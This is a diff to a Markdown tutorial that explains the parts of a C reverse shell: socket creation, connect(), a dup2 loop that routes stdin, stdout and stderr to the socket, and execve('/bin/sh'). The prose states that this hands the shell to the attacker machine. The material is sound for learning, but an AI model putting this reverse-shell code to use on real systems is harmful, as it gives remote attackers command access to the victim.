@@ -68,7 +68,14 @@ int main () {
 	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	
 	// connect syscall
+	connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 	
+	for (int i = 0; i < 3; i++){
+		// dup2(sockfd, 0) - stdin
+		// dup2(sockfd, 1) - stdout
+		// dup2(sockfd, 2) - stderr
+		dup2(sockfd, i);
+	}
 }
 ```
 
@@ -463,13 +470,44 @@ IPPROTO_TCP   // For TCP
 IPPROTO_UDP   // For UDP
 ```
 
+**🔥 What if we Wrote:**
+
+```c
+int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP);
+```
+You're combining:
+- `AF_INET` → IPv4 (✅ OK)
+- `SOCK_STREAM` → **TCP**-style connection (✅ valid type)
+- `IPPROTO_UDP` → **UDP** protocol (❌ mismatch!)
+
+**💥 What Happens?**
+This is a **mismatch** between **socket type** and **protocol**:
+
+| Socket Type   | Expected Protocol |
+| ------------- | ----------------- |
+| `SOCK_STREAM` | `IPPROTO_TCP`     |
+| `SOCK_DGRAM`  | `IPPROTO_UDP`     |
+If you mix these up:
+- Most systems will **return `-1`** from `socket()`
+- `errno` will be set to something like `EPROTONOSUPPORT` (Protocol not supported)
+- Your program will fail to create the socket
+
+**✅ The Correct Combinations:**
+
+| Code Snippet                                | Meaning                            |
+| ------------------------------------------- | ---------------------------------- |
+| `socket(AF_INET, SOCK_STREAM, 0)`           | TCP (system chooses `IPPROTO_TCP`) |
+| `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)` | Same, but explicitly TCP           |
+| `socket(AF_INET, SOCK_DGRAM, 0)`            | UDP (system chooses `IPPROTO_UDP`) |
+| `socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)`  | Same, but explicitly UDP           |
+
 🔸 **What Happens Inside the `socket()` Call?**
 1. The **operating system** creates a new socket object in the kernel.
 2. It associates this socket with the **networking protocols** based on the arguments you provided (`AF_INET`, `SOCK_STREAM`, and `0`). 
 3. It returns a **[file descriptor](https://en.wikipedia.org/wiki/File_descriptor)** (which is an integer, here it's `sockfd`) that you can use to refer to this socket for later operations, like connecting, reading, writing, etc.
 
 `sockfd`:
-- **`sockfd`** will hold the **socket file descriptor** — a unique identifier for this socket.
+- **`sockfd`** will hold the **socket [file descriptor](https://en.wikipedia.org/wiki/File_descriptor)** - a unique identifier for this socket.
 - You’ll use this descriptor to perform actions on the socket (e.g., connect, send, receive).
 > **In Summary:**
 1. Creates a **TCP socket** (since `SOCK_STREAM` and `AF_INET` are used).
@@ -478,7 +516,186 @@ IPPROTO_UDP   // For UDP
 4. The **file descriptor** for the new socket is stored in `sockfd`, which will be used in future socket-related operations like `connect()`, `bind()`, `send()`, etc.
 ---
 ```c
-for (int i =0; i < 3; i++){
-	dup2(sockdf, i);
+connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+```
+
+This function is trying to connect your program (the **client**) to a **remote server**.
+
+> 🧠 Function Signature:
+
+```c
+int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+```
+
+| Parameter                  | Description                                                                                          |
+| -------------------------- | ---------------------------------------------------------------------------------------------------- |
+| `sockfd`                   | The socket file descriptor you created with `socket()`                                               |
+| `(struct sockaddr *)&addr` | Pointer to the **destination address** you're trying to connect to, cast to a generic socket address |
+| `sizeof(addr)`             | Size of the `addr` structure in bytes                                                                |
+> 🧠 Expression:
+```c
+(struct sockaddr *)&addr
+```
+
+ “Take the memory address of the variable `addr`, and **treat it as a pointer** to a `struct sockaddr`.”
+
+ >**Step-by-Step Breakdown:**
+
+1. `addr` is a `struct sockaddr_in`
+	In your code:
+	```c
+	struct sockaddr_in addr;
+	```
+	This structure looks like:
+	```c
+	struct sockaddr_in {
+	    short            sin_family;   // address family (AF_INET)
+	    unsigned short   sin_port;     // port number
+	    struct in_addr   sin_addr;     // IP address
+	    char             sin_zero[8];  // padding
+	};
+	```
+	This is specifically for **IPv4 addresses**.
+
+2. `connect()` wants `struct sockaddr*`
+	But the `connect()` function is defined like this:
+	```c
+	int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+	```
+	Notice that it wants a pointer to a **generic struct `sockaddr`**, not `sockaddr_in`.
+	```c
+	struct sockaddr {
+	    unsigned short sa_family;
+	    char           sa_data[14];
+	};
+	```
+
+ 🔍 So the `sockaddr` is a **generic version** that can represent multiple address types (IPv4, IPv6, Unix sockets, etc.)
+
+ >⚠️ Problem:
+
+- Your address is stored in a **`sockaddr_in`**.   
+- But the function expects a **`sockaddr*`**.
+
+>**Solution**: Use Typecasting
+
+That’s why we do:
+```c
+(struct sockaddr *)&addr
+```
+This:
+- Takes the memory address of `addr` (`&addr`)
+- Typecasts it to a `struct sockaddr*` (generic type)
+- Satisfies the function's parameter requirement
+
+Even though the types are different, they are **compatible in memory layout** for IPv4. So this is safe to do as long as the real structure is `sockaddr_in`.
+
+In C networking, almost all the socket functions that work with addresses use `struct sockaddr*`. But we pass `sockaddr_in*` (or `sockaddr_in6*` for IPv6) and **typecast** them.
+
+>What Happens Internally?
+
+1. **`connect()`** sends a SYN packet to the remote server’s IP and port (in `addr`).
+2. The server should respond with a SYN-ACK. 
+3. Your system replies with ACK, completing the **3-way TCP handshake**.
+4. Now the socket is **connected**, and you can use `send()`, `recv()`, etc.
+
+---
+```C
+for (int i = 0; i < 3; i++){
+	dup2(sockfd, i);
 }
 ```
+
+>🎯 **What is `dup2()`?**
+
+`dup2(oldfd, newfd)` is a **UNIX system call** that duplicates a file descriptor.
+ **It means:**  
+ 👉 “Make `newfd` refer to the same file (or socket) as `oldfd`.”
+
+##### 🔧 File Descriptors (FDs)
+
+In UNIX-like systems, every file, socket, or device is represented by an integer — a **file descriptor**.
+
+Standard ones are:
+
+| FD  | Description              |
+| --- | ------------------------ |
+| 0   | Standard Input (stdin)   |
+| 1   | Standard Output (stdout) |
+| 2   | Standard Error (stderr)  |
+
+- You’re replacing
+    - `stdin` (0)
+    - `stdout` (1)
+    - `stderr` (2)
+- With your **socket file descriptor (`sockfd`)**.
+
+**That means:**
+> Anything the shell **reads from input**, **writes to output**, or **prints as an error**, now goes over the **network socket** instead of the terminal.
+
+ **What Happens:**
+
+| `dup2(sockfd, 0)` | Replace stdin with the socket  |
+| ----------------- | ------------------------------ |
+| `dup2(sockfd, 1)` | Replace stdout with the socket |
+| `dup2(sockfd, 2)` | Replace stderr with the socket |
+
+So when the shell starts, it thinks it’s talking to a normal terminal — but it’s actually reading/writing through the network socket to the attacker machine.
+##### 🔒 Why Is This Used in Reverse Shells?
+
+When you do:
+```c
+execve("/bin/sh", NULL, NULL);
+```
+You're launching a shell. Normally, it would talk to your keyboard and screen. But by running `dup2()` before it, you're:
+
+✅ Hijacking input/output  
+✅ Routing them over the network  
+✅ Giving control of the shell to whoever is on the other side of the socket
+
+- `dup2(sockfd, i)` replaces standard I/O file descriptors with the socket
+- The shell launched later will **send/receive data through the socket**
+- That’s how reverse shells "hook" into your terminal session remotely
+---
+```C
+execve("/bin/sh", NULL, NULL);
+```
+
+ >**What is `execve()`?**
+
+`execve()` is a **low-level system call** that replaces the **current process** with a **new one**.
+##### Syntax:
+
+```c
+int execve(const char *pathname, char *const argv[], char *const envp[]);
+```
+
+| Parameter  | Meaning                                                    |
+| ---------- | ---------------------------------------------------------- |
+| `pathname` | Path to the executable you want to run (`/bin/sh`)         |
+| `argv[]`   | Arguments to the program (like `argv[0]`, `argv[1]`, etc.) |
+| `envp[]`   | Environment variables for the program                      |
+
+```c
+execve("/bin/sh", NULL, NULL);
+```
+**This means:**
+- 📍 `"run the shell program"`
+- ❌ "with no arguments"
+- ❌ "with no environment variables"
+
+ **You're telling the system:**  
+ “Replace this process with `/bin/sh` (Bourne shell), and start it **from scratch**.”
+
+>What does **`execve()`** do exactly?
+
+- **Does NOT return** if successful — the current program is **replaced**.
+- Your original C code is gone — only the shell exists in memory now.
+- Because you already did:
+    ```c
+    dup2(sockfd, 0);
+    dup2(sockfd, 1);
+    dup2(sockfd, 2);
+    ```
+	The shell’s **input/output/error** go through the **network socket**!
+---
